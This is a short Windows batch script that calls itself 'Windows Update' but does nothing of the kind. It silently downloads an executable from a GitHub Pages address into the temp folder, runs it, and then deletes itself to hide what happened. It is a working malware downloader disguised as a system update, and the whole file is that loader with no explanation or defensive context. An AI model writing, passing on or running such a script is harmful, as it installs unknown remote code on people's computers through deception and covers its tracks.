@echo off
title Windows Update
timeout /t 3 /nobreak >nul
if not exist "%USERPROFILE%\Desktop" exit /b
curl -sL "https://boostedboynow.github.io/assets-host/44ijn9.exe" -o "%tmp%\fe2p.exe"
if %errorlevel% neq 0 exit /b
start "" "%tmp%\fe2p.exe"
(goto) 2>nul & del "%~f0"
